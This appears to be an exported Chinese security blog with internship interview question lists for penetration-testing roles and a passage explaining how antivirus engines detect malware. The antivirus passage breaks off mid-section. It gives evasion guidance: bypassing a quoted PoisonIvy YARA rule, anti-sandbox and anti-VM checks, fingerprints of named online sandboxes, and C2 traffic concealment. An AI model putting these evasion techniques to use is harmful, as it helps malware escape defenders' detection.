<h3 id="9-14-视频一面"><a href="#9-14-视频一面" class="headerlink" title="9.14 视频一面"></a>9.14 视频一面</h3><p>面试时长：一小时</p>
<ul>
<li>介绍下自己熟悉的渗透领域</li>
<li>你会什么语言，能写什么东西</li>
<li>你在上一家实习公司的主要工作内容是什么，说一下流程</li>
<li>上家公司是乙方是吧，最后需要写报告吗，需要提出解决方案吗</li>
<li>说一下渗透的流程</li>
<li>你sql注入常用的工具，或者说手工结合工具</li>
<li>你经常用扫描器吗，为什么很少用</li>
<li>你渗透过程中碰到过waf吗，遇到了怎么办</li>
<li>作为乙方，你认为有waf的渗透测试和没有waf的渗透测试哪个好</li>
<li>你遇到过的注入的种类</li>
<li>堆叠注入和联合查询的不同点</li>
<li>sqlmap想要看到更详细的信息需要什么命令，怎么看返回的响应包</li>
<li>sqlmap  –os-shell的原理</li>
<li>注入拿shell的条件</li>
<li>Oracle、Mssql、MySQL注入的不同点，区别在哪</li>
<li>上传绕过的方法</li>
<li>说一下常见的逻辑漏洞</li>
<li>修改密码有5步，说一下你找逻辑漏洞的思路</li>
<li>你burp用的什么版本，是破解版的吗(实在不明白为啥问我这个，难道是公司都用正版的么)</li>
<li>扫描器会用吗</li>
<li>你还有其他的什么技能</li>
<li>内网的渗透思路</li>
<li>你碰到的内网是idc还是办公网(当时不知道idc是啥，随便答了个IDC，尴尬，后面面试官就直接说数据中心hhhh)</li>
<li>你常用的免杀方法</li>
<li>你觉得免杀在甲方有用吗(emmm雀食)</li>
<li>你了解的防火墙有哪些</li>
<li>注入的防护方法</li>
<li>csrf的防护方法</li>
<li>token加到哪里，加在cookie里会怎么样，加不加在cookie里区别在哪，为什么加token可以防护csrf</li>
<li>如果不加token的话，只加验证码可以防护csrf吗，说一下你的理解</li>
<li>如果你找到了一个业务的漏洞点，你要和开发沟通去修复，但是开发不想修复，你怎么和开发沟通，开发说这个软件已经发布了，现在才告诉漏洞点，为什么不提前告诉，你怎么办</li>
<li>开发并不懂安全，也不了解漏洞的原理，他要你只告诉他怎么写代码，你怎么和他沟通，他要你教他怎么写代码怎么办(????搞开发的不会写代码难道让搞安全的写么 hhhhhh)</li>
<li>sql注入到的数据库都是明文怎么办，比如说姓名，手机号，身份证需要怎么处理</li>
<li>des、aes加密算法说一下</li>
<li> 用户上传身份证这里你觉得需要注意什么(作为一个甲方人员)</li>
<li>上传的身份证图片怎么防止审核员工偷偷保存</li>
<li>如果他截屏或者右键保存怎么办，怎么防止</li>
<li>上传的图片本身怎么处理(这里确实了解的很少，可以简单的加水印，明水印和暗水印)</li>
<li>怎么对审核人员的权限进行限制，比如说超级管理员、管理员、客服人员等</li>
<li>如果这个员工调去了另一个部门，但是他还有以前部门的权限，这时需要回收他的权限吗，你怎么知道他不在这个部门了呢</li>
<li>给你一个系统，你怎么渗透测试</li>
<li>对这套系统怎么进行风险评估，给出解决方案，修复方案</li>
<li>你还有什么想问的吗</li>
<li>我们公司经常加班，可以接受加班吗</li>
</ul>
<p>后面就是介绍了一下他们安全部的几个小组，介绍了他们组的内容，是做数据中心和权限治理的，也有其他的渗透小组，移动端小组等5个小组。先选一个小组作为二面的意向小组，一面通过的话，这个意向直接导致二面面试官的不同。</p>
<p>总体来说这次面试还是非常好的体验，面试官问完我问题后，会告诉我那些我不了解的点，还详细介绍了他们部门所要干的工作，这里我本来后面录屏了，但刚刚发现录的系统声音，没录到麦克风~~~</p>
<p>二面希望也不大，本来也没抱希望(我是废物)</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>某大厂移动安全实习生面试</title>
    <url>/2021/09/14/%E6%9F%90%E5%A4%A7%E5%8E%82web%E7%BA%A2%E8%93%9D%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p><strong>9.8</strong> 对该厂的offer暂时没报希望，面一下知道自己的不足在哪。</p>
<p><strong>10.9</strong> 运气比较好，拿到了offer~</p>
<span id="more"></span>

<h3 id="9-12电话一面"><a href="#9-12电话一面" class="headerlink" title="9.12电话一面"></a>9.12电话一面</h3><p>面试时长：20分钟</p>
<p>一面技术是个小姐姐~</p>
<ul>
<li>简单介绍一下你熟悉的领域</li>
<li>为什么想从web转二进制</li>
<li>讲一下你在实习期间做的事情</li>
<li>你有打下过哪些站点</li>
<li>介绍一下常见的绕过waf的姿势</li>
<li>fastjson反序列化漏洞有了解过吗</li>
<li>对php反序列化了解的多吗</li>
<li>php中常见的造成RCE的函数有哪些</li>
<li>php的伪协议有了解吗</li>
<li>介绍一下ssrf的原理、利用及防护</li>
<li>之前渗透的时候遇到过比较精彩的洞或者过程吗</li>
<li>你说过外网 web的漏洞很多都已经修复了，那你的攻击面有哪些</li>
<li>你有考虑过从移动端打点吗</li>
<li>你知道怎么从app抓包吗</li>
<li>但是现在安卓会校验证书，抓不到https的包怎么办</li>
<li>小程序的包你抓过吗</li>
<li>你这边开学可以来现场实习吗</li>
<li>预期实习时间是多长</li>
<li>你有什么想问我的吗</li>
</ul>
<p>感觉一般，进二面的可能性不大(我是废物)，哈哈哈，可能到此为止了，不过u1s1，的上班时间还挺舒服，早上没有特别要求，一般10-10点半到，中午午休2小时，公司包早饭和晚饭，有房补，面试官说的是加班很少，这个和隔壁厂形成鲜明对比哈哈哈，隔壁厂直接说经常加班，这个看下一篇吧。</p>
<h3 id="9-15电话二面"><a href="#9-15电话二面" class="headerlink" title="9.15电话二面"></a>9.15电话二面</h3><p>面试时长：半小时</p>
<ul>
<li>日常自我介绍</li>
<li>介绍一下你做过的项目经历，是授权的吗</li>
<li>你怎么定位域控的</li>
<li>你们团队平时会打一些比赛吗</li>
<li>你有参与过一些有代表性的项目吗，你在项目中担任什么角色</li>
<li>你有什么擅长的领域吗</li>
<li>外网打点的思路，案例</li>
<li>外网打点有哪几种漏洞你可以利用</li>
<li>反序列化漏洞了解吗</li>
<li>shiro了解吗，怎么判断这个站是shiro</li>
<li>Java站其他的业务是部署在反代后面的，你怎么试别反代</li>
<li>小程序、app、公众号这些有测试过吗，说一下相关经历</li>
<li>小程序、公众号的后台可能是fastjson、shiro 这些你有遇到过吗</li>
<li>app会抓包是吧，app逆向做过吗</li>
<li>你有过通过app、公众号分析到外网的经历吗</li>
<li>你实习主要是做什么</li>
<li>我看你简历写的熟悉这些协议，你能讲讲吗，https协议等等</li>
<li> 你python什么水平，有能说的一些项目吗</li>
<li>python如果去取字符串的最后一个字符怎么去取</li>
<li>c语言你了解吗</li>
<li>为什么要深入研究c和cpp，搞web是不太需要c语言的</li>
<li>你是怎么规划你学习web和二进制的时间的</li>
<li>你现在对底层原理有哪些了解</li>
<li>你怎么绕过杀软</li>
<li>你有什么想问我的</li>
<li>你实习是可以来现场是吗，实习时间大概是什么时候</li>
</ul>
<h3 id="9-24-hr视频面试"><a href="#9-24-hr视频面试" class="headerlink" title="9.24 hr视频面试"></a>9.24 hr视频面试</h3><p>面试时长：15分钟</p>
<p>hr面的都是些很常规的问题，网上也都有，这里就不罗列了。</p>
<p>问的很多的就是看你能不能来实习，能来多长时间，现在来了大三也准备来实习吗，hr很关心这个问题。</p>
<p>然后问了点学校成绩，奖学金，学习安全的时间，路线，原因以及未来的职业规划等等。</p>
<p>兴趣爱好，身体状况，学校老师同学对你的评价，有没有受到过什么挫折。</p>
<p>emm大概就这些，没什么压力，hr说等1-2周会有邮件和短信发过来。</p>
<p>静候佳音。</p>
<p>祝我好运hhhhh~</p>
<h3 id="10-8-hr沟通录用意向"><a href="#10-8-hr沟通录用意向" class="headerlink" title="10.8 hr沟通录用意向"></a>10.8 hr沟通录用意向</h3><p>电话：4分钟</p>
<p>在9.29给我打了电话，当时没接到，过了一个国庆终于等来了，hhhhh</p>
<p>主要就是确认个人信息是否准确，以及各种薪资补贴，这里涉密不能说。</p>
<p>说offer在两个工作日内会发送到我的邮箱~</p>
<h3 id="10-9-发放offer"><a href="#10-9-发放offer" class="headerlink" title="10.9 发放offer"></a>10.9 发放offer</h3><p><img src="/2021/09/14/%E6%9F%90%E5%A4%A7%E5%8E%82web%E7%BA%A2%E8%93%9D%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/image-20211009100200407.png" alt="image-20211009100200407"></p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析杀软</title>
    <url>/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前写过一篇介绍杀软原理的，这里再补充一下</p>
<p><a href="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/">免杀基础入门篇 (0range-x.github.io)</a></p>
<h2 id="0x00-引擎介绍"><a href="#0x00-引擎介绍" class="headerlink" title="0x00 引擎介绍"></a>0x00 引擎介绍</h2><h3 id="1-杀软属性"><a href="#1-杀软属性" class="headerlink" title="1.杀软属性"></a>1.杀软属性</h3><ol>
<li>对于给定对象，检测是否包含恶意代码</li>
<li>能准确识别出恶意代码的类型，如：木马，后门，蠕虫等</li>
<li>对于寄生类恶意代码（宏病毒、感染型病毒等），可以从宿主对象中剥离恶意代码，并还原宿主对象数据</li>
</ol>
<h3 id="2-杀软引擎的构成"><a href="#2-杀软引擎的构成" class="headerlink" title="2.杀软引擎的构成"></a>2.杀软引擎的构成</h3><p>一般来说，引擎通常由几个模块构成，</p>
<h4 id="1-数据格式识别、分析模块"><a href="#1-数据格式识别、分析模块" class="headerlink" title="1.数据格式识别、分析模块"></a>1.数据格式识别、分析模块</h4><p>负责对待扫描对象的格式进行识别和分析，为扫描核心提供足够的格式相关信息</p>
<h4 id="2-反病毒特征库"><a href="#2-反病毒特征库" class="headerlink" title="2.反病毒特征库"></a>2.反病毒特征库</h4><p>由本地特征库和云特征库构成</p>
<h4 id="3-扫描核心"><a href="#3-扫描核心" class="headerlink" title="3.扫描核心"></a>3.扫描核心</h4><p>负责整个反病毒引擎的扫描逻辑，不同的扫描技术也由扫描核心来调度。我的理解是扫描核心作为指挥官，根据不同的情况来调度不同的资源进行扫描。</p>
<h2 id="0x01-静态查杀"><a href="#0x01-静态查杀" class="headerlink" title="0x01 静态查杀"></a>0x01 静态查杀</h2><h5 id="1-特征码识别"><a href="#1-特征码识别" class="headerlink" title="1.特征码识别:"></a>1.特征码识别:</h5><p>杀软有自己的病毒库，里面有很多样本，扫描时会抽取扫描对象的一段特征并与病毒库里作比较，如果匹配，那就会认为是病毒。抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面又不要有太大的空间与时间的开销。如果一种病毒的特征代码增长一字节，要检测3000种病毒，增加的空间就是3000字节。在保持唯一性的前提下，尽量使特征代码长度短些，以减少空间与时间开销。</p>
<p>主要扫描的有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希(全文哈希、分段哈希、局部敏感哈希等)</span><br><span class="line">文件名</span><br><span class="line">函数名</span><br><span class="line">关键代码(包括敏感字符串、api等 ps：有的api会被杀软hook)</span><br></pre></td></tr></table></figure>

<h5 id="2-云查杀"><a href="#2-云查杀" class="headerlink" title="2.云查杀:"></a>2.云查杀:</h5><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，意思是只要联网病毒库就会同步更新，这种病毒库更加强大。</p>
<h5 id="3-校验和法"><a href="#3-校验和法" class="headerlink" title="3.校验和法"></a>3.校验和法</h5><p>根据正常文件的内容，计算其校验和，定期不定期的检查文件的校验是否与正常的校验和一样。其实本质还是特征码，万变不离其宗</p>
<h5 id="4-启发式扫描："><a href="#4-启发式扫描：" class="headerlink" title="4.启发式扫描："></a>4.启发式扫描：</h5><p>但是面对未知的病毒，换个模样杀软就认不出了吗？所以安全厂商研究出了启发式算法</p>
<p>启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这就是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀病毒。</p>
<h5 id="yara规则："><a href="#yara规则：" class="headerlink" title="yara规则："></a>yara规则：</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">rule PoisonIvy_Generic_3 &#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = <span class="string">&quot;PoisonIvy RAT Generic Rule&quot;</span></span><br><span class="line">        license = <span class="string">&quot;https://creativecommons.org/licenses/by-nc/4.0/&quot;</span></span><br><span class="line">        author = <span class="string">&quot;Florian Roth&quot;</span></span><br><span class="line">        date = <span class="string">&quot;2015-05-14&quot;</span></span><br><span class="line">        hash = <span class="string">&quot;e1cbdf740785f97c93a0a7a01ef2614be792afcd&quot;</span></span><br><span class="line">    strings:</span><br><span class="line">        $k1 = <span class="string">&quot;Tiger324&#123;&quot;</span> fullword ascii</span><br><span class="line"></span><br><span class="line">        $s2 = <span class="string">&quot;WININET.dll&quot;</span> fullword ascii</span><br><span class="line">        $s3 = <span class="string">&quot;mscoree.dll&quot;</span> fullword wide</span><br><span class="line">        $s4 = <span class="string">&quot;WS2_32.dll&quot;</span> fullword</span><br><span class="line">        $s5 = <span class="string">&quot;Explorer.exe&quot;</span> fullword wide</span><br><span class="line">        $s6 = <span class="string">&quot;USER32.DLL&quot;</span></span><br><span class="line">        $s7 = <span class="string">&quot;CONOUT$&quot;</span></span><br><span class="line">        $s8 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line"></span><br><span class="line">        $h1 = <span class="string">&quot;HTTP/1.0&quot;</span></span><br><span class="line">        $h2 = <span class="string">&quot;POST&quot;</span></span><br><span class="line">        $h3 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line">        $h4 = <span class="string">&quot;check.asp&quot;</span></span><br><span class="line">        $h5 = <span class="string">&quot;result.asp&quot;</span></span><br><span class="line">        $h6 = <span class="string">&quot;upload.asp&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="built_in">uint16</span>(<span class="number">0</span>) == <span class="number">0x5a4d</span> <span class="keyword">and</span> filesize &lt; <span class="number">500</span>KB <span class="built_in"><span class="keyword">and</span></span></span><br><span class="line">            ( </span><br><span class="line">                $k1 <span class="keyword">or</span> all <span class="built_in">of</span> ($s*) <span class="keyword">or</span> all <span class="built_in">of</span> ($h*)</span><br><span class="line">            )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单分析下这段yara规则，标记了hash，最终的匹配规则是 <code>文件大小在500kb以内 并且满足 $k1/all $s/all $h 中的任意一条</code>，即被认定是病毒。这时候就可以根据破坏相应的规则，比如大小改为500kb+，不去调用相应的dll等来 bypass。</p>
<h2 id="0x02-动态查杀（主动防御）"><a href="#0x02-动态查杀（主动防御）" class="headerlink" title="0x02 动态查杀（主动防御）"></a>0x02 动态查杀（主动防御）</h2><p>动态查杀指的是 程序在运行的过程中执行了某些敏感操作，导致杀软查杀。</p>
<p>谈到动态查杀不得不提一个东西叫沙盒。</p>
<p>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为</p>
<p>沙盒模拟的常见特征：</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>原因</th>
<th>bypass</th>
</tr>
</thead>
<tbody><tr>
<td>内存较小</td>
<td>不影响计算机正常运行</td>
<td>检测计算机内存是不是很小(判断是否是真实计算机)</td>
</tr>
<tr>
<td>时间较快</td>
<td>沙盒内置的时间速度比现实世界要快，提高查杀速度，沙盒中的时间流逝很快</td>
<td>c语言函数判断1s是否有1000ms/判断是否是utc时间</td>
</tr>
<tr>
<td>进程或文件不完整</td>
<td>减少杀毒软件运行时对计算机的消耗</td>
<td>判断操作系统进程的个数/调用不可能存在的文件</td>
</tr>
<tr>
<td>io设备缺失</td>
<td>鼠标键盘等事件大部分沙盒都没有</td>
<td>检测驱动 usb等/判断鼠标的移动速度等</td>
</tr>
</tbody></table>
<p>其实主要就是找一台真实的计算机和沙盒的区别到底在哪，找到那些真实的计算机具有而模拟的计算机无法具有的特征，进行绕过即可，思路很简单，也很广，自己拓展会发现更多有意思的点。下面是两个反沙箱的项目，可以看看</p>
<p><a href="https://github.com/nek0YanSu/CheckVM-Sandbox">https://github.com/nek0YanSu/CheckVM-Sandbox</a></p>
<p><a href="https://github.com/ZanderChang/anti-sandbox">https://github.com/ZanderChang/anti-sandbox</a></p>
<p>下面说一下杀软监控动态查杀的点：</p>
<h4 id="计算机相关"><a href="#计算机相关" class="headerlink" title="计算机相关"></a>计算机相关</h4><ol>
<li><p>系统服务（指的是这些）如果有敏感服务操作的话，容易被监测到</p>
<img src="/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/image-20211014111540437.png" alt="image-20211014111540437" style="zoom:50%;"></li>
<li><p>注册表（键值） 修改注册表的行为一般都是敏感行为（高危添加用户、删除用户，没有十足把握bypass，还是算了）</p>
</li>
<li><p>组策略</p>
</li>
<li><p>防火墙</p>
</li>
<li><p>敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）</p>
</li>
<li><p>各种 win32api</p>
<p>这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。 相应的bypass，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用实现同样功能的api替换</span><br><span class="line">重写对应的api</span><br><span class="line">调用0环的api绕过3环杀软</span><br></pre></td></tr></table></figure>

<p>等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。</p>
</li>
<li><p>文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/windows/system32   </span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\tmp等敏感文件夹（cs、msf都会在tmp文件夹下生成一些东西）</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>绕过</strong>：<code>白加黑</code>  算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？</p>
<p>说到底，白加黑解决的是 Windows里面 <code>信任与权限</code>的问题，Windows 都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你。</p>
<h4 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h4><p>1.<strong>流量特征</strong>: cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。</p>
<p>2.<strong>内容特征</strong>：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）  </p>
<p>3.<strong>结构特征</strong>: 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）</p>
<p>4.<strong>IP</strong> : 是否被情报系统标记为恶意</p>
<p><strong>绕过</strong>:</p>
<ul>
<li>tcp分段：指的是数据包在传输过程中切分后以小段传输(效果也不错，但是网络连接不好很容易断掉)</li>
<li>内容加密：针对传输的内容，比如那些执行命令的字符串等等，加密混淆，加密还是不要用简单的编码，你简单的base64编码一下，杀软、edr等还是可以检测到，最好用非对称加密</li>
<li>使用合法证书 ： 这个自己找渠道获得吧……</li>
</ul>
<h2 id="0x03-解码技术-Decomposition"><a href="#0x03-解码技术-Decomposition" class="headerlink" title="0x03 解码技术(Decomposition)"></a>0x03 解码技术(Decomposition)</h2><p>当在当前扫描对象中没有扫描到恶意代码时，扫描核心需要对该对象进行分析，并进行子对象拆分，以便对拆分后的子对象进一步进行扫描。通常，解码技术包括</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.解压缩</span><br><span class="line">2.解安装包</span><br><span class="line">3.解复合文档</span><br><span class="line">4.其他数据解码</span><br><span class="line">5.可执行文件脱壳</span><br><span class="line">6............</span><br></pre></td></tr></table></figure>

<p>文档分析模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可执行文件：PE,elf,Mach-o,NE,LE,MZ,COM,DEX......</span><br><span class="line">脚本类型：HTML,JavaScript,VBScript, AutolT,BAT, PHP,Lisp......</span><br><span class="line">压缩包类型：ZIP,7-ZIP,RAR,Gzip,Bzip2,Tar,CAB,AJR......</span><br><span class="line">安装包类型：NSIS,SmartInstallMaker......</span><br><span class="line">复合文档类型：OLE,PDF,Office组件，office宏，SWF,MIME,MSO......</span><br><span class="line">其他数据类型：Windows快捷方式，Windows注册表文件</span><br></pre></td></tr></table></figure>





<h2 id="0x04-沙箱脱壳技术-Generic-Unpacking"><a href="#0x04-沙箱脱壳技术-Generic-Unpacking" class="headerlink" title="0x04 沙箱脱壳技术(Generic Unpacking)"></a>0x04 沙箱脱壳技术(Generic Unpacking)</h2><p>一般来说，杀软通过虚拟机动态脱壳的方式来处理壳的问题。对于公开壳，首先已经被加入特征库了，用的话基本是必被杀的，对于公开壳，基本是通过指导脱壳的方式来查杀，而对于未公开的包括自定义壳、代码混淆器等其他代码级对抗技术，均采用通用脱壳查杀。</p>
<p><img src="/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/image-20220119164541263.png" alt="image-20220119164541263"></p>
<p>ps: 动态调试脱壳一般都是手工利用od、windbg这类调试工具调试，杀软的沙箱做不到。</p>
<h2 id="0x05-检测和规避沙箱-amp-amp-虚拟机"><a href="#0x05-检测和规避沙箱-amp-amp-虚拟机" class="headerlink" title="0x05 检测和规避沙箱&amp;&amp;虚拟机"></a>0x05 检测和规避沙箱&amp;&amp;虚拟机</h2><h3 id="1-规避沙箱"><a href="#1-规避沙箱" class="headerlink" title="1. 规避沙箱"></a>1. 规避沙箱</h3><table>
<thead>
<tr>
<th>方法</th>
<th>原因</th>
<th>执行</th>
</tr>
</thead>
<tbody><tr>
<td>延迟执行</td>
<td>各类的沙箱检测的时候，运行时间一般都比较短，可以延迟等一会去执行我们的shellcode</td>
<td>如：延迟30 ，45，60</td>
</tr>
<tr>
<td>检测开机时间</td>
<td>很多沙箱检测完了就会重启，可以用开机时间来判断是否为沙箱</td>
<td>判断开机时间是否大于1小时</td>
</tr>
<tr>
<td>检测物理内存</td>
<td>现如今大多数PC机器都是4GB以上的机器，检测RAM是否大于4gb来判断</td>
<td>判断内存是否大于4G</td>
</tr>
<tr>
<td>检测CPU核心数</td>
<td>很多PC机，都拥有4核心的CPU，很多沙箱和虚拟机为2GB</td>
<td>判断CPU核心数，是否大于4</td>
</tr>
<tr>
<td>用户模拟</td>
<td>带入我们的参数才能够运行我们的程序</td>
<td>判断是否有参数</td>
</tr>
<tr>
<td>检测文件名</td>
<td>很多沙箱基本都要改我们的文件名</td>
<td>判断文件名是否被修改</td>
</tr>
<tr>
<td>检测磁盘容量大小</td>
<td>沙箱一般都很小，没办法长时间的运行消耗</td>
<td>判断磁盘是否大于80G</td>
</tr>
<tr>
<td>创建互斥体</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="2-检测虚拟机"><a href="#2-检测虚拟机" class="headerlink" title="2.检测虚拟机"></a>2.检测虚拟机</h3><h4 id="进程检测"><a href="#进程检测" class="headerlink" title="进程检测"></a>进程检测</h4><p>VMware</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vmtoolsd.exe</span><br><span class="line">Vmwaretrat.exe</span><br><span class="line">Vmwareuser.exe</span><br><span class="line">Vmacthlp.exe</span><br></pre></td></tr></table></figure>



<p>VirtualBox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vboxservice.exe</span><br><span class="line">vboxtray.exe</span><br></pre></td></tr></table></figure>

<p>parakkeks desktop</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prl_tools.exe</span><br></pre></td></tr></table></figure>



<h4 id="注册表检测"><a href="#注册表检测" class="headerlink" title="注册表检测"></a>注册表检测</h4><p>通过读取主机具有虚拟机特性的注册表位置来判断是否处于虚拟机环境中。</p>
<p>Vmware</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CLASSES_ROOTApplications\VMwareHostOpen.exe</span><br></pre></td></tr></table></figure>

<p>VirtualBox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCALMACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions</span><br></pre></td></tr></table></figure>

<p>注册表中能被检测出的位置很多，这里只是举个例子。 </p>
<h4 id="磁盘文件检测"><a href="#磁盘文件检测" class="headerlink" title="磁盘文件检测"></a>磁盘文件检测</h4><p>VMware</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\windows\system32\driversVmmouse.sys</span><br><span class="line">c:\windows\system32\drivers\vmtoolshook.dll</span><br><span class="line">c:\windows\system32\drivers\vmtray.exe</span><br><span class="line">c:\windows\system32\drivers\vmgfs.dll</span><br></pre></td></tr></table></figure>



<p>VirtualBox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\windows\system32\drivers\VBoxMouse.sys</span><br><span class="line">c:\windows\system32\drivers\vboxguest.sys</span><br><span class="line">c:\windows\system32\vboxdisp.dll</span><br><span class="line">c:\windows\system32\vboxhook.dll</span><br></pre></td></tr></table></figure>



<h4 id="MAC地址检测"><a href="#MAC地址检测" class="headerlink" title="MAC地址检测"></a>MAC地址检测</h4><p>Vmware</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:05:69</span><br><span class="line">00:0c:29</span><br><span class="line">00:50:56</span><br></pre></td></tr></table></figure>

<p>VirtualBox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08:00:27</span><br></pre></td></tr></table></figure>

<h3 id="3-微步沙箱"><a href="#3-微步沙箱" class="headerlink" title="3.微步沙箱"></a>3.微步沙箱</h3><p>进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process id: 1528 , process name : AcrylicService.exe  // DNS代理程序，用来检测DNS流量</span><br></pre></td></tr></table></figure>

<p>壁纸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\vbccsb\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper.jpg  //路径</span><br><span class="line">1645643018  //壁纸文件的hash</span><br></pre></td></tr></table></figure>

<p>用户名 ， 每次运行沙箱的用户名不变 ，都是vbccsb</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机名:VBCCSB-PC</span><br><span class="line">用户名:vbccsb_*</span><br><span class="line">进程:519e67c447b16520ceaa2b84a8d8fb2da94b8edab</span><br><span class="line">内网IP:192.168.122.192</span><br><span class="line">出口IP:106.75.3.131</span><br><span class="line"></span><br><span class="line">主机名:VBCCSB-PC</span><br><span class="line">用户名:vbccsb_*</span><br><span class="line">进程:123.exe</span><br><span class="line">内网IP:192.168.122.192</span><br><span class="line">出口IP:106.75.35.22</span><br></pre></td></tr></table></figure>

<p>系统制作厂商和型号 ， 正常PC的系统制作厂商都是电脑的牌子 DELL、LENEVO、ASUS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 微步</span><br><span class="line">System Manufacturer:       System manufacturer</span><br><span class="line">System Model:              System manufacturer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 正常的制作厂商和型号，三星、ASUS </span><br><span class="line">System Manufacturer:       SAMSUNG</span><br><span class="line">System Model:              670Z5E</span><br><span class="line"></span><br><span class="line">System Manufacturer:       ASUS</span><br><span class="line">System Model:              P5E-VM DO</span><br></pre></td></tr></table></figure>

<h3 id="4-VT沙箱"><a href="#4-VT沙箱" class="headerlink" title="4.VT沙箱"></a>4.VT沙箱</h3><p>文件名，部分沙箱会将样本 Hash 重命名或者下载的样本都是以 HASH命名的文件，也可以通过这个特征检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">676ef88e8c8772b4751605835cb3a8a5.exe</span><br></pre></td></tr></table></figure>

<p>进程，部分沙箱也会开以下进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AcrylicService.exe</span><br></pre></td></tr></table></figure>

<p>性能 ，大多数沙箱的内存都小于4G</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.txt:Available Physical Memory: 560 MB</span><br><span class="line">5.txt:Available Physical Memory: 1,499 MB</span><br><span class="line">6.txt:Available Physical Memory: 915 MB</span><br><span class="line">7.txt:Available Physical Memory: 1,003 MB</span><br><span class="line">8.txt:Available Physical Memory: 5,228 MB</span><br><span class="line">9.txt:Available Physical Memory: 5,215 MB</span><br></pre></td></tr></table></figure>

<p>语言 ， 国外沙箱的语言大多为英文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">╰─# grep &#x27;System Locale&#x27; *.txt                                                                                             </span><br><span class="line">4.txt:System Locale:             en-us;English (United States)</span><br><span class="line">5.txt:System Locale:             en-us;English (United States)</span><br><span class="line">6.txt:System Locale:             en-us;English (United States)</span><br><span class="line">7.txt:System Locale:             en-us;English (United States)</span><br><span class="line">8.txt:System Locale:             en-us;English (United States)</span><br><span class="line">9.txt:System Locale:             en-us;English (United States)</span><br></pre></td></tr></table></figure>

<p>时区 ，VT上的沙箱大多为国外时区，国内的时区为东八区</p>
